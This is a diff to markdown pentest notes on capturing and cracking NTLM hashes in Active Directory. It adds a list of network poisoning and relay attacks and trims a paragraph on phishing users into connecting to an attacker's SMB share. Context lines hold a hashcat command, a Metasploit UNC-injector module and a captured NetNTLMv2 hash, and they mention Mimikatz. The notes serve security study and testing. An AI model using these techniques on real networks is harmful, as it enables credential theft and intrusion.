@@ -58,9 +58,20 @@ hashcat -m 5600 -a 3 hash.txt
 
 ## Hash Attacks
 
+### Access to the network
+
+If you have access to the network but are outside the AD environment these attacks can get you passwords/hashes:
+```
+- RID cycling
+- SCF file upload
+- LLMNR/NBTNS/mDNS poisoning
+- SMB relay
+- IPv6 DNS poison
+```
+
 ### Acquiring Remotely
 
-Essentially we need the user to attempt to attempt to connect to a network resource we control, as the users computer will attempt the Challenge Response Authentication and in doing so send us their NetNTLMv1/2 hash. This can be achieve through social engineering/phishing. For example the Word UNC Injector metasploit module will create a word document that when opened will try to connect to a smb share we are hosting.
+Essentially social engineering to feed malware, UNC injected macros, login forms, etc
 
 ```
 use auxiliary/docx/word_unc_injector
@@ -81,7 +92,6 @@ A useful tool for this is Impacket's smbserver.py. There is a metasploit module 
 [*] User IEUser\IEWIN7 authenticated successfully                 
 [*] IEUser::IEWIN7:4141414141414141:3398e72b4769bc7ce2c2ff74ae035fb5:010100000000000000f20b88d6c7d4015435bb9f50dedce2000000000100100052006300510050005600580062004a00020010004c0054005600450059005900790048000300100052006300510050005600580062004a00040010004c0054005600450059005900790048000700080000f20b88d6c7d40106000400020000000800300030000000000000000000000000300000c85fc1b5dc7f1c43ed2cc0285dec3b7569075b9adc80bfb81ceffb714e3715630a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390039002e00320031003900000000000000000000000000
 ```
-
 ### Acquiring from a privileged account
 
 The most popular way of acquiring NTLM hashes once we have a privileged account is using Mimikatz. Mimikatz requires an account with *debug* privileges, esentially Local Administrators.
